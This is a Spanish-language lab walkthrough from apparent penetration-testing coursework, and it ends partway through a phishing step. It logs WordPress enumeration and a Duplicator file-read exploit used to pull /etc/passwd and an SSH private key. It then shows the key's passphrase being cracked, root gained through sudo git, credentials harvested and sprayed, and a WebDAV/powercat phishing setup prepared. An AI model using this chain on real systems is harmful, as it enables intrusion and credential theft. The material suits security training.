# {CATEGORÍA}: {DESCRIPCIÓN}

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion WEBSRV1
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# cat 244-nmap.txt      
# Nmap 7.95 scan initiated Fri Jun 20 12:31:44 2025 as: /usr/lib/nmap/nmap -sC -sV -Pn -oN 244-nmap.txt 192.168.190.244
Nmap scan report for 192.168.190.244
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.190.244/main/
|_http-generator: WordPress 6.0.2
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 20 12:32:02 2025 -- 1 IP address (1 host up) scanned in 18.17 seconds
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# whatweb http://192.168.234.244
http://192.168.234.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.234.244], RedirectLocation[http://192.168.234.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.234.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.234.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# wpscan --url http://192.168.234.244 --enumerate p --plugins-detection aggressive -o wpscan        
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# cat wpscan      
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.234.244/ [192.168.234.244]
[+] Effective URL: http://192.168.234.244/main/
[+] Started: Sat Jun 21 18:35:47 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.234.244/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.234.244/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.234.244/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0.2 identified (Insecure, released on 2022-08-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.234.244/main/feed/, <generator>https://wordpress.org/?v=6.0.2</generator>
 |  - http://192.168.234.244/main/comments/feed/, <generator>https://wordpress.org/?v=6.0.2</generator>

[+] WordPress theme in use: hello-elementor
 | Location: http://192.168.234.244/wp-content/themes/hello-elementor/
 | Last Updated: 2025-01-21T00:00:00.000Z
 | Readme: http://192.168.234.244/wp-content/themes/hello-elementor/readme.txt
 | [!] The version is out of date, the latest version is 3.3.0
 | Style URL: http://192.168.234.244/wp-content/themes/hello-elementor/style.css
 | Style Name: Hello Elementor
 | Style URI: https://elementor.com/hello-theme/?utm_source=wp-themes&utm_campaign=theme-uri&utm_medium=wp-dash
 | Description: A plain-vanilla & lightweight theme for Elementor page builder...
 | Author: Elementor Team
 | Author URI: https://elementor.com/?utm_source=wp-themes&utm_campaign=author-uri&utm_medium=wp-dash
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.6.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.234.244/wp-content/themes/hello-elementor/style.css, Match: 'Version: 2.6.1'


[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.234.244/wp-content/plugins/akismet/
 | Latest Version: 5.3.5
 | Last Updated: 2024-11-19T02:02:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] classic-editor
 | Location: http://192.168.234.244/wp-content/plugins/classic-editor/
 | Last Updated: 2024-12-03T21:03:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/classic-editor/readme.txt
 | [!] The version is out of date, the latest version is 1.6.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/classic-editor/, status: 403
 |
 | Version: 1.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/classic-editor/readme.txt

[+] contact-form-7
 | Location: http://192.168.234.244/wp-content/plugins/contact-form-7/
 | Last Updated: 2025-01-14T02:31:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/contact-form-7/readme.txt
 | [!] The version is out of date, the latest version is 6.0.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/contact-form-7/, status: 403
 |
 | Version: 5.6.3 (90% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.234.244/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.6.3
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/contact-form-7/readme.txt

[+] duplicator
 | Location: http://192.168.234.244/wp-content/plugins/duplicator/
 | Last Updated: 2024-11-21T15:50:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.11.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.234.244/wp-content/plugins/elementor/
 | Last Updated: 2025-01-23T18:05:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/elementor/readme.txt
 | [!] The version is out of date, the latest version is 3.27.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/elementor/, status: 403
 |
 | Version: 3.7.7 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.234.244/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.7.7
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.234.244/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.234.244/wp-content/plugins/elementor/readme.txt

[+] wordpress-seo
 | Location: http://192.168.234.244/wp-content/plugins/wordpress-seo/
 | Last Updated: 2025-01-21T09:01:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/wordpress-seo/readme.txt
 | [!] The version is out of date, the latest version is 24.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/wordpress-seo/, status: 200
 |
 | Version: 19.7.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/wordpress-seo/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/wordpress-seo/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jun 21 18:37:34 2025
[+] Requests Done: 1556
[+] Cached Requests: 16
[+] Data Sent: 433.51 KB
[+] Data Received: 910.466 KB
[+] Memory used: 238.773 MB
[+] Elapsed time: 00:01:46
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# searchsploit duplicator
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                                                                                                              | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery                                                                                                 | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                                                                                                                        | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                                                                                                                       | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                                                                                                        | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)                                                                                           | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                                                                                                             | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                                                                                                                      | php/webapps/50993.txt
WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Account Takeover                                                                             | php/webapps/51874.py
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery                                                                                                 | php/webapps/40908.html
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
#### Paso 2: Explotacion WEBSRV1
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# searchsploit -m 50420

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# python3 50420.py http://192.168.234.244 /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# python3 50420.py http://192.168.234.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# ssh2john id_rsa > ssh.hash
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (id_rsa)     
1g 0:00:01:40 DONE (2025-06-21 19:05) 0.009968g/s 14.03p/s 14.03c/s 14.03C/s teacher..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# ssh -i id_rsa daniela@192.168.234.244           
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 21 11:16:16 PM UTC 2025

  System load:  0.0               Processes:               209
  Usage of /:   73.9% of 8.02GB   Users logged in:         0
  Memory usage: 22%               IPv4 address for ens192: 192.168.234.244
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

13 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
daniela@websrv1:~$ 
```

#### Escalada de privilegios en WEBSRV1

```bash
# En kali:
──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# cp /usr/share/peass/linpeas/linpeas.sh .

# En WEBSRV1

daniela@websrv1:~$ wget http://192.168.45.213:8000/linpeas.sh
--2025-06-21 23:18:43--  http://192.168.45.213:8000/linpeas.sh
Connecting to 192.168.45.213:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                           100%[====================================================================================================================>] 820.39K   788KB/s    in 1.0s    

2025-06-21 23:18:44 (788 KB/s) - ‘linpeas.sh’ saved [840082/840082]

daniela@websrv1:~$ ls
linpeas.sh  snap
daniela@websrv1:~$ chmod a+x ./linpeas.sh
daniela@websrv1:~$ ./linpeas.sh

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                   
Matching Defaults entries for daniela on websrv1:                                                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git

...

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                                                                                                                 
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );

daniela@websrv1:~$ sudo git -p help config
GIT-CONFIG(1)                                                                                    Git Manual                                                                                    GIT-CONFIG(1)

NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [<file-option>] [--type=<type>] [--fixed-value] [--show-origin] [--show-scope] [-z|--null] name [value [value-pattern]]
       git config [<file-option>] [--type=<type>] --add name value
       git config [<file-option>] [--type=<type>] [--fixed-value] --replace-all name value [value-pattern]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] --get name [value-pattern]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] --get-all name [value-pattern]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] [--name-only] --get-regexp name_regex [value-pattern]
       git config [<file-option>] [--type=<type>] [-z|--null] --get-urlmatch name URL
       git config [<file-option>] [--fixed-value] --unset name [value-pattern]
       git config [<file-option>] [--fixed-value] --unset-all name [value-pattern]
       git config [<file-option>] --rename-section old_name new_name
       git config [<file-option>] --remove-section name
       git config [<file-option>] [--show-origin] [--show-scope] [-z|--null] [--name-only] -l | --list
       git config [<file-option>] --get-color name [default]
       git config [<file-option>] --get-colorbool name [stdout-is-tty]
       git config [<file-option>] -e | --edit

DESCRIPTION
       You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the value will be escaped.

       Multiple lines can be added to an option by using the --add option. If you want to update or unset an option which can occur on multiple lines, a value-pattern (which is an extended regular
       expression, unless the --fixed-value option is given) needs to be given. Only the existing values that match the pattern are updated or unset. If you want to handle the lines that do not match the
       pattern, just prepend a single exclamation mark in front (see also the section called “EXAMPLES”), but note that this only works when the --fixed-value option is not in use.

       The --type=<type> option instructs git config to ensure that incoming and outgoing values are canonicalize-able under the given <type>. If no --type=<type> is given, no canonicalization will be
       performed. Callers may unset an existing --type specifier with --no-type.

       When reading, the values are read from the system, global and repository local configuration files by default, and options --system, --global, --local, --worktree and --file <filename> can be used
       to tell the command to read from only that location (see the section called “FILES”).

       When writing, the new value is written to the repository local configuration file by default, and options --system, --global, --worktree, --file <filename> can be used to tell the command to write
       to that location (you can say --local but that is the default).

       This command will fail with non-zero status upon error. Some exit codes are:

       •   The section or key is invalid (ret=1),

       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

       •   the config file cannot be written (ret=4),

       •   you try to unset an option which does not exist (ret=5),

       •   you try to unset/set an option for which multiple lines match (ret=5), or

       •   you try to use an invalid regexp (ret=6).

       On success, the command returns the exit code 0.

       A list of all available configuration variables can be obtained using the git help --config command.

OPTIONS
       --replace-all
           Default behavior is to replace at most one line. This replaces all lines matching the key (and optionally the value-pattern).

       --add
!/bin/bash
root@websrv1:/home/daniela# whoami
root
root@websrv1:/home/daniela# 
```

#### POST explotacion WEBSRV1:
```bash
root@websrv1:/home/daniela# cd /srv/www/wordpress
root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean
root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
-
```
#### En kali:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# crackmapexec smb 192.168.234.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.234.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\offsec:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\offsec:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\offsec:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# crackmapexec smb 192.168.234.242 -u john -p "dqsTwTpZPn#nL" --shares
SMB         192.168.234.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.234.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.234.242 445    MAILSRV1         [+] Enumerated shares
SMB         192.168.234.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.234.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.234.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.234.242 445    MAILSRV1         C$                              Default share
SMB         192.168.234.242 445    MAILSRV1         IPC$            READ            Remote IPC
```

#### Acceso a la red interna: phishing

> Preparamos nuestros archivos config.Library-ms, automatic-configuration.lnk con los correspondientes **payloads en el servidor webdav** y servimos **powercat.ps1 con python en el puerto 8000**

```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
└─# wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/OffSec/27-Assembling-The-Pieces/WINPREP
...

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
└─# python3 -m http.server 8000
...
```

* Ejecutamos el mail

```bash
